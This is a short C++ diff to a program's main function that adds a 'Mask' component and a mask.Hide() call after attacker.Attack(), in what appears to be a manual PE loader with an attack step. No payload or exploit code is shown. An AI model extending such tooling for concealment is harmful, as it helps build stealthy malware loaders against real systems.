@@ -4,6 +4,7 @@
 #include "ImgManager.h"
 #include "ImpTableFixer.h"
 #include "Loader.h"
+#include "Mask.h"
 #include "Relocator.h"
 #include "Terminal.h"
 
@@ -66,9 +67,11 @@ int main(int argc, char* argv[]) {
     ImpTableFixer impTableFixer;
     ApiMsReader apiMsReader;
     Attacker& attacker = Attacker::getInstance(&imgManager);
+    Mask mask(&imgManager);
     Loader loader(&imgManager, &relocator, &impTableFixer, &apiMsReader);
     loader.Load(arg2);
     attacker.Attack();
+    mask.Hide();
     loader.Start();
   }
   return 0;
